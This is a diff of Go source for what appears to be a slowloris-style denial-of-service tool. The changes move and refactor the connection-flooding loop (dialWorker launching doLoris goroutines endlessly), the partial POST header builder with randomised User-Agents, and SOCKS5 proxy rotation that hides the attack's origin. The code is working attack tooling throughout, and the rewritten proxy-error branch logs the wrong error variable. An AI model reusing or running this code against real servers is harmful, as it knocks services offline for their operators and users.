@@ -93,16 +93,7 @@ func generateRequestHeader(uri string) []byte  {
 	if *randUserAgent {
 		userAgent = "\nUser-Agent: " + userAgents[rand.Intn(len(userAgents))]
 	}
-	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent,*contentLength))
-}
-
-func dialWorker(destinationHostPort, proxyHostPort string, requestHeader []byte) {
-	for {
-		conn := dialDestination(destinationHostPort, proxyHostPort)
-		if conn != nil {
-			go doLoris(conn, requestHeader)
-		}
-	}
+	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent, *contentLength))
 }
 
 func generateProxyList(path string) (lines []string) {
@@ -121,7 +112,7 @@ func generateProxyList(path string) (lines []string) {
 		proxyHostPort := scanner.Text()
 		proxyUri, err := url.Parse(proxyHostPort)
 		if err != nil {
-			log.Fatalf("Cannot parse destinationUrl=[%s]: [%s]\n", proxyHostPort, err)
+			log.Fatalf("Cannot parse proxyUrl=[%s]: [%s]\n", proxyHostPort, err)
 		}
 		lines = append(lines, proxyUri.RequestURI())
 	}
@@ -129,22 +120,31 @@ func generateProxyList(path string) (lines []string) {
 
 }
 
+func dialWorker(destinationHostPort, proxyHostPort string, requestHeader []byte) {
+	for {
+		conn := dialDestination(destinationHostPort, proxyHostPort)
+		if conn != nil {
+			go doLoris(conn, requestHeader)
+		}
+	}
+}
+
 func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteCloser {
 	var conn net.Conn
 	var err error
 	if len(proxyHostPort) == 0 {
 		conn, err = net.Dial("tcp", destinationHostPort)
-		if err != nil {
-			log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
-			return nil
-		}
 	} else {
-		dialer, err := proxy.SOCKS5("tcp", proxyHostPort, nil, proxy.Direct)
-		if err != nil {
+		dialer, _err := proxy.SOCKS5("tcp", proxyHostPort, nil, proxy.Direct)
+		if _err != nil {
 			log.Printf("Couldn't setup proxy to [%s]: [%s]\n", proxyHostPort, err)
 			return nil
 		}
 		conn, err = dialer.Dial("tcp", destinationHostPort)
+	}
+	if err != nil {
+		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
+		return nil
 	}
 
 	tcpConn := conn.(*net.TCPConn)
